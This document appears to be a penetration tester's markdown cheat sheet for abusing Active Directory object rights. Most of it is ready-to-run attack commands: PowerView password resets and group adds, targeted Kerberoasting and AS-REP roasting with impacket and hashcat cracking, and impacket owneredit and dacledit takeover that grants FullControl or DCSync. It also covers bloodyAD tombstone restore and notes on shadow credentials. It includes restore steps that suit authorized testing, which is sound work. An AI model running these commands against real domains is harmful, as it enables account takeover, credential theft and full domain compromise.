# AD object rights and advanced paths

Per edge note: principal + right + exact target + original value. Check allow/deny, object-specific GUIDs, inheritance and the DC used ([PowerView ACL checks](powerview.md#object-acls)). A BloodHound edge is a lead, not a backup.

| Right | Use |
| --- | --- |
| `ForceChangePassword` | Reset the user's password |
| `GenericWrite` / `GenericAll` on a user | Set an SPN (targeted Kerberoast), pre-auth flag, key credentials |
| `GenericAll` on a group | Add yourself as a member |
| `WriteOwner` / `WriteDACL` | Take ownership / grant yourself rights (keep the original owner + ACL) |

## Password reset and group membership
```powershell
Set-DomainUserPassword -Identity <TARGET-USER> -AccountPassword (ConvertTo-SecureString '<NEW-PW>' -AsPlainText -Force)
net group "<TARGET-GROUP>" <USER> /add /domain
```
- A reset doesn't show the old password and can break encrypted user data and running services.
- Membership: save the original members; remove only what you added → [privileged-groups](privileged-groups.md#account-operators).

## Targeted Kerberoast (SPN write)
AD module, SPN-write confirmed. Add one SPN, never replace the set:

```powershell
$DC = '<DC-FQDN>'
$Cred = Get-Credential -UserName '<DOMAIN>\<USER>' -Message 'Object read/write credential'
$Victim = Get-ADUser '<TARGET-USER>' -Server $DC -Credential $Cred -Properties servicePrincipalName -ErrorAction Stop
$OriginalSpns = @($Victim.servicePrincipalName | ForEach-Object { [string]$_ })
$ProofSpn = 'proof/<TARGET-USER>.<DOMAIN.TLD>'
setspn.exe -Q $ProofSpn
Set-ADUser $Victim -Server $DC -Credential $Cred -ServicePrincipalNames @{Add=$ProofSpn} -ErrorAction Stop
```
```bash
impacket-GetUserSPNs -dc-ip <DC-IP> -request-user <TARGET-USER> -outputfile target-tgs.txt '<DOMAIN.TLD>/<USER>'
hashcat -m 13100 target-tgs.txt /usr/share/wordlists/rockyou.txt
```
Remove only the added SPN:
```powershell
Set-ADUser $Victim -Server $DC -Credential $Cred -ServicePrincipalNames @{Remove=$ProofSpn} -ErrorAction Stop
```
- Continue only if the `setspn -Q` shows the proof SPN is unused.

## Targeted AS-REP (UAC write)
Read the current `userAccountControl` first. If `DONT_REQ_PREAUTH` is already set, just collect.

```bash
bloodyAD -u <USER> -p '<PW>' -d <DOMAIN.TLD> --host <DC-IP> add uac <TARGET-USER> -f DONT_REQ_PREAUTH
impacket-GetNPUsers <DOMAIN.TLD>/<TARGET-USER> -dc-ip <DC-IP> -no-pass -format hashcat
bloodyAD -u <USER> -p '<PW>' -d <DOMAIN.TLD> --host <DC-IP> remove uac <TARGET-USER> -f DONT_REQ_PREAUTH
```
- Username is a positional arg for `GetNPUsers`; `-request-user` belongs to `GetUserSPNs`.

## Owner and DACL
```bash
impacket-owneredit -dc-ip <DC-IP> -action read -target <TARGET> '<DOMAIN.TLD>/<USER>:<PW>'
impacket-dacledit -dc-ip <DC-IP> -action backup -file target-dacl.bak -target <TARGET> '<DOMAIN.TLD>/<USER>:<PW>'
impacket-owneredit -dc-ip <DC-IP> -action write -new-owner <USER> -target <TARGET> '<DOMAIN.TLD>/<USER>:<PW>'
impacket-dacledit -dc-ip <DC-IP> -action write -rights FullControl -principal <USER> -target <TARGET> '<DOMAIN.TLD>/<USER>:<PW>'
```
Restore, DACL first, then ownership:
```bash
impacket-dacledit -dc-ip <DC-IP> -action restore -file target-dacl.bak '<DOMAIN.TLD>/<USER>:<PW>'
impacket-owneredit -dc-ip <DC-IP> -action write -new-owner-sid <ORIGINAL-OWNER-SID> -target <TARGET> '<DOMAIN.TLD>/<USER>:<PW>'
```
- Ownership may not give a usable DACL right: OWNER RIGHTS ACEs and BlockOwnerImplicitRights (computer-derived objects) change that. Check the effective DACL.
- `-rights`: `FullControl`, `ResetPassword`, `WriteMembers`, `DCSync`, `Custom`.
- Restoring an old ACL erases concurrent edits.

## Sealed LDAP, object restore & newer primitives
`strongerAuthRequired` → Kerberos / sealed LDAP, or try LDAPS.
```bash
bloodyAD -u <USER> -p '<PW>' -d <DOMAIN.TLD> --host <DC-FQDN> get writable
```
Tombstone restore (write on the object + create-child in the destination OU):
```bash
bloodyAD -u <USER> -p '<PW>' -d <DOMAIN.TLD> --host <DC-FQDN> set restore <DELETED-OBJECT> \
  --newParent OU=<OU>,DC=<DOMAIN>,DC=<TLD>
```
- Shadow credentials need writable `msDS-KeyCredentialLink` + PKINIT. `KDC_ERR_PADATA_TYPE_NOSUPP` → DC doesn't support it.
- BadSuccessor / dMSA: DC patch state + rights over both the dMSA and the target.
